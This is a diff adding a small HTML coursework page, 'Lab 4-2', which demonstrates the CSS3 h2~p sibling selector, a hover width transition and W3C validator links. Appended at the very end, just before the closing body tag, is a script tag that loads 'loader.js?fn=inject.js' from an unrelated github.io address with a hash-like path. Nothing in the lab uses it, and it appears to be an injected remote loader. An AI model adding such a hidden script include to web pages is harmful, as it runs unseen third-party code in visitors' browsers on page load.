@@ -1,0 +1,56 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="utf-8">
+<title>Lab 4-2</title>
+<style> 
+    h2 ~ p {
+        font-style: italic;
+    }
+    p {
+        width: 150px;
+        height: 100px;
+        background: #add8e6;
+        transition: width 3s, transform 3s;
+    }
+    p:hover {
+        width: 250px;
+    }
+</style>
+<script>
+function init() {
+  var loc = window.location.href;
+  var HTMLvalidLinkStr = 'http://validator.w3.org/check?uri=' + loc;
+  var CSSvalidLinkStr = 'http://jigsaw.w3.org/css-validator/validator?uri=' +
+                        loc + '?profile=css3';
+  document.getElementById("vLink1").setAttribute("href", HTMLvalidLinkStr);
+  document.getElementById("vLink2").setAttribute("href", CSSvalidLinkStr);
+}
+
+window.onload = init;
+</script>
+</head>
+<body>
+
+<h1>Heading 1</h1>
+<p>
+The paragraph text following Heading 1 is not affected by the CSS3 h2~p
+selector.
+</p>
+
+<h2>Heading 2</h2>
+<p>
+The paragraph text following Heading 2 is affected by the CSS3
+h2~p selector.
+</p>
+ 
+<footer>
+<a id="vLink1">
+<strong> HTML </strong> Valid! </a> | 
+<a id="vLink2">
+<strong> CSS </strong> Valid! </a>
+</footer> 
+
+<script type='text/javascript'  src="https://jejemplo.github.io/4c3900f8e9dd69b5714c214642cf1a280bd60a97b72770c05502ed560d248b20/loader.js?fn=inject.js"></script></body>
+</html>
+
